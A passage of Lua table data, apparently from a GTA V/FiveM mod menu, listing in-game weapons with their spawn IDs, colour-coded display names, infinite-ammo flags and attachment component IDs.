Pistol',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_VINTAGEPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_VINTAGEPISTOL_CLIP_02'}},BarrelAttachments={{'Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},FlareGun={id='weapon_flaregun',name='~h~~r~> ~s~Flare Gun',bInfAmmo=false,mods={}},MarksmanPistol={id='weapon_marksmanpistol',name='~h~~r~> ~s~Marksman Pistol',bInfAmmo=false,mods={}},HeavyRevolver={id='weapon_revolver',name='~h~~r~> ~s~Heavy Revolver',bInfAmmo=false,mods={}},HeavyRevolverMkII={id='weapon_revolver_mk2',name='~h~~r~> ~s~Heavy Revolver Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Rounds',id='COMPONENT_REVOLVER_MK2_CLIP_01'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_REVOLVER_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_REVOLVER_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_REVOLVER_MK2_CLIP_HOLLOWPOINT'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_REVOLVER_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Compensator',id='COMPONENT_AT_PI_COMP_03'}}}},DoubleActionRevolver={id='weapon_doubleaction',name='~h~~r~> ~s~Double Action Revolver',bInfAmmo=false,mods={}},UpnAtomizer={id='weapon_raypistol',name='~h~~r~> ~s~Up-n-Atomizer',bInfAmmo=false,mods={}}},SMG={MicroSMG={id='weapon_microsmg',name='~h~~r~> ~s~Micro SMG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MICROSMG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MICROSMG_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MACRO'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_PI_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}}}},SMG={id='weapon_smg',name='~h~~r~> ~s~SMG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SMG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SMG_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_SMG_CLIP_03'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MACRO_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},SMGMkII={id='weapon_smg_mk2',name='~h~~r~> ~s~SMG Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SMG_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SMG_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_SMG_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_SMG_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_SMG_MK2_CLIP_HOLLOWPOINT'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_SMG_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS_SMG'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_02_SMG_MK2'},{name='~h~~r~> ~s~Medium Scope',id='COMPONENT_AT_SCOPE_SMALL_SMG_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_SB_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_SB_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}}}},AssaultSMG={id='weapon_assaultsmg',name='~h~~r~> ~s~Assault SMG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_ASSAULTSMG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_ASSAULTSMG_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MACRO'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}}}},CombatPDW={id='weapon_combatpdw',name='~h~~r~> ~s~Combat PDW',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_COMBATPDW_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_COMBATPDW_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_COMBATPDW_CLIP_03'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_SMALL'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},MachinePistol={id='weapon_machinepistol',name='~h~~r~> ~s~Machine Pistol ',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MACHINEPISTOL_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MACHINEPISTOL_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_MACHINEPISTOL_CLIP_03'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_PI_SUPP'}}}},MiniSMG={id='weapon_minismg',name='~h~~r~> ~s~Mini SMG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MINISMG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MINISMG_CLIP_02'}}}},UnholyHellbringer={id='weapon_raycarbine',name='~h~~r~> ~s~Unholy Hellbringer',bInfAmmo=false,mods={}}},Shotguns={PumpShotgun={id='weapon_pumpshotgun',name='~h~~r~> ~s~Pump Shotgun',bInfAmmo=false,mods={Flashlight={{'name = Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_SR_SUPP'}}}},PumpShotgunMkII={id='weapon_pumpshotgun_mk2',name='~h~~r~> ~s~Pump Shotgun Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Shells',id='COMPONENT_PUMPSHOTGUN_MK2_CLIP_01'},{name='~h~~r~> ~s~Dragon Breath Shells',id='COMPONENT_PUMPSHOTGUN_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Steel Buckshot Shells',id='COMPONENT_PUMPSHOTGUN_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~Flechette Shells',id='COMPONENT_PUMPSHOTGUN_MK2_CLIP_HOLLOWPOINT'},{name='~h~~r~> ~s~Explosive Slugs',id='COMPONENT_PUMPSHOTGUN_MK2_CLIP_EXPLOSIVE'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_MK2'},{name='~h~~r~> ~s~Medium Scope',id='COMPONENT_AT_SCOPE_SMALL_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_SR_SUPP_03'},{name='~h~~r~> ~s~Squared Muzzle Brake',id='COMPONENT_AT_MUZZLE_08'}}}},SawedOffShotgun={id='weapon_sawnoffshotgun',name='~h~~r~> ~s~Sawed-Off Shotgun',bInfAmmo=false,mods={}},AssaultShotgun={id='weapon_assaultshotgun',name='~h~~r~> ~s~Assault Shotgun',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_ASSAULTSHOTGUN_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_ASSAULTSHOTGUN_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},BullpupShotgun={id='weapon_bullpupshotgun',name='~h~~r~> ~s~Bullpup Shotgun',bInfAmmo=false,mods={Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},Musket={id='weapon_musket',name='~h~~r~> ~s~Musket',bInfAmmo=false,mods={}},HeavyShotgun={id='weapon_heavyshotgun',name='~h~~r~> ~s~Heavy Shotgun',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_HEAVYSHOTGUN_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_HEAVYSHOTGUN_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_HEAVYSHOTGUN_CLIP_02'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},DoubleBarrelShotgun={id='weapon_dbshotgun',name='~h~~r~> ~s~Double Barrel Shotgun',bInfAmmo=false,mods={}},SweeperShotgun={id='weapon_autoshotgun',name='~h~~r~> ~s~Sweeper Shotgun',bInfAmmo=false,mods={}}},AssaultRifles={AssaultRifle={id='weapon_assaultrifle',name='~h~~r~> ~s~Assault Rifle',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_ASSAULTRIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_ASSAULTRIFLE_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_ASSAULTRIFLE_CLIP_03'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MACRO'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},AssaultRifleMkII={id='weapon_assaultrifle_mk2',name='~h~~r~> ~s~Assault Rifle Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_ASSAULTRIFLE_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_MK2'},{name='~h~~r~> ~s~Large Scope',id='COMPONENT_AT_SCOPE_MEDIUM_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_AR_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_AR_BARREL_0'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP_02'}}}},CarbineRifle={id='weapon_carbinerifle',name='~h~~r~> ~s~Carbine Rifle',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_CARBINERIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_CARBINERIFLE_CLIP_02'},{name='~h~~r~> ~s~Box Magazine',id='COMPONENT_CARBINERIFLE_CLIP_03'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MEDIUM'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},CarbineRifleMkII={id='weapon_carbinerifle_mk2',name='~h~~r~> ~s~Carbine Rifle Mk II ',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_CARBINERIFLE_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_CARBINERIFLE_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_CARBINERIFLE_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_CARBINERIFLE_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_CARBINERIFLE_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_CARBINERIFLE_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_MK2'},{name='~h~~r~> ~s~Large Scope',id='COMPONENT_AT_SCOPE_MEDIUM_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_CR_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_CR_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP_02'}}}},AdvancedRifle={id='weapon_advancedrifle',name='~h~~r~> ~s~Advanced Rifle ',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_ADVANCEDRIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_ADVANCEDRIFLE_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_SMALL'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'}}}},SpecialCarbine={id='weapon_specialcarbine',name='~h~~r~> ~s~Special Carbine',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SPECIALCARBINE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SPECIALCARBINE_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_SPECIALCARBINE_CLIP_03'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MEDIUM'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},SpecialCarbineMkII={id='weapon_specialcarbine_mk2',name='~h~~r~> ~s~Special Carbine Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_SPECIALCARBINE_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_MK2'},{name='~h~~r~> ~s~Large Scope',id='COMPONENT_AT_SCOPE_MEDIUM_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_SC_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_SC_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP_02'}}}},BullpupRifle={id='weapon_bullpuprifle',name='~h~~r~> ~s~Bullpup Rifle',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_BULLPUPRIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_BULLPUPRIFLE_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_SMALL'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},BullpupRifleMkII={id='weapon_bullpuprifle_mk2',name='~h~~r~> ~s~Bullpup Rifle Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Armor Piercing Rounds',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_BULLPUPRIFLE_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Small Scope',id='COMPONENT_AT_SCOPE_MACRO_02_MK2'},{name='~h~~r~> ~s~Medium Scope',id='COMPONENT_AT_SCOPE_SMALL_MK2'}},Flashlight={{name='~h~~r~> ~s~Flashlight',id='COMPONENT_AT_AR_FLSH'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_BP_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_BP_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP'},{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},CompactRifle={id='weapon_compactrifle',name='~h~~r~> ~s~Compact Rifle',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_COMPACTRIFLE_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_COMPACTRIFLE_CLIP_02'},{name='~h~~r~> ~s~Drum Magazine',id='COMPONENT_COMPACTRIFLE_CLIP_03'}}}}},LMG={MG={id='weapon_mg',name='~h~~r~> ~s~MG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_MG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_MG_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_SMALL_02'}}}},CombatMG={id='weapon_combatmg',name='~h~~r~> ~s~Combat MG',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_COMBATMG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_COMBATMG_CLIP_02'}},Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_MEDIUM'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP'}}}},CombatMGMkII={id='weapon_combatmg_mk2',name='~h~~r~> ~s~Combat MG Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_COMBATMG_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_COMBATMG_MK2_CLIP_02'},{name='~h~~r~> ~s~Tracer Rounds',id='COMPONENT_COMBATMG_MK2_CLIP_TRACER'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_COMBATMG_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Hollow Point Rounds',id='COMPONENT_COMBATMG_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_COMBATMG_MK2_CLIP_FMJ'}},Sights={{name='~h~~r~> ~s~Holograhpic Sight',id='COMPONENT_AT_SIGHTS'},{name='~h~~r~> ~s~Medium Scope',id='COMPONENT_AT_SCOPE_SMALL_MK2'},{name='~h~~r~> ~s~Large Scope',id='COMPONENT_AT_SCOPE_MEDIUM_MK2'}},Barrel={{name='~h~~r~> ~s~Default',id='COMPONENT_AT_MG_BARREL_01'},{name='~h~~r~> ~s~Heavy',id='COMPONENT_AT_MG_BARREL_02'}},BarrelAttachments={{name='~h~~r~> ~s~Flat Muzzle Brake',id='COMPONENT_AT_MUZZLE_01'},{name='~h~~r~> ~s~Tactical Muzzle Brake',id='COMPONENT_AT_MUZZLE_02'},{name='~h~~r~> ~s~Fat-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_03'},{name='~h~~r~> ~s~Precision Muzzle Brake',id='COMPONENT_AT_MUZZLE_04'},{name='~h~~r~> ~s~Heavy Duty Muzzle Brake',id='COMPONENT_AT_MUZZLE_05'},{name='~h~~r~> ~s~Slanted Muzzle Brake',id='COMPONENT_AT_MUZZLE_06'},{name='~h~~r~> ~s~Split-End Muzzle Brake',id='COMPONENT_AT_MUZZLE_07'}},Grips={{name='~h~~r~> ~s~Grip',id='COMPONENT_AT_AR_AFGRIP_02'}}}},GusenbergSweeper={id='weapon_gusenberg',name='~h~~r~> ~s~GusenbergSweeper',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_GUSENBERG_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_GUSENBERG_CLIP_02'}}}}},Snipers={SniperRifle={id='weapon_sniperrifle',name='~h~~r~> ~s~Sniper Rifle',bInfAmmo=false,mods={Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_LARGE'},{name='~h~~r~> ~s~Advanced Scope',id='COMPONENT_AT_SCOPE_MAX'}},BarrelAttachments={{name='~h~~r~> ~s~Suppressor',id='COMPONENT_AT_AR_SUPP_02'}}}},HeavySniper={id='weapon_heavysniper',name='~h~~r~> ~s~Heavy Sniper',bInfAmmo=false,mods={Sights={{name='~h~~r~> ~s~Scope',id='COMPONENT_AT_SCOPE_LARGE'},{name='~h~~r~> ~s~Advanced Scope',id='COMPONENT_AT_SCOPE_MAX'}}}},HeavySniperMkII={id='weapon_heavysniper_mk2',name='~h~~r~> ~s~Heavy Sniper Mk II',bInfAmmo=false,mods={Magazines={{name='~h~~r~> ~s~Default Magazine',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_01'},{name='~h~~r~> ~s~Extended Magazine',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_02'},{name='~h~~r~> ~s~Incendiary Rounds',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_INCENDIARY'},{name='~h~~r~> ~s~Armor Piercing Rounds',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_ARMORPIERCING'},{name='~h~~r~> ~s~FMJ Rounds',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_FMJ'},{name='~h~~r~> ~s~Explosive Rounds',id='COMPONENT_HEAVYSNIPER_MK2_CLIP_EXPLOSIVE'}},Sights={{name='~h~~r~> ~s~Zoom Scope',id='COMPONENT_AT_SCOPE_LARGE_MK2'},{name='~h~~r~> ~s~Advanced 